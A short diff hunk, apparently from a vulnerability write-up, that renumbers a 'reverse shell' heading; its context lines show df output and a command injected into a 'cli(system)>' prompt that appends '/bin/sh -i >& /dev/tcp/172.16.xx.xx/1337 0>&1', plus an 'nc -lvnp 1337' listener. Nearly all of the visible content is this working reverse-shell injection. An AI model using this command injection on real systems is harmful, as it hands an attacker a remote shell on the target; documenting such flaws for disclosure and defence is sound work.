@@ -39,7 +39,7 @@ tmpfs                3.8G     0  3.8G    0% /sys/fs/cgroup
 /dev/sda1            477M  115M  333M   26% /boot
 tmpfs                776M     0  776M    0% /run/user/0
 
-reverse shell
+3、reverse shell
 cli(system)> df -h && /bin/sh -i >& /dev/tcp/172.16.xx.xx/1337 0>&1
 
 $ nc -lvnp 1337
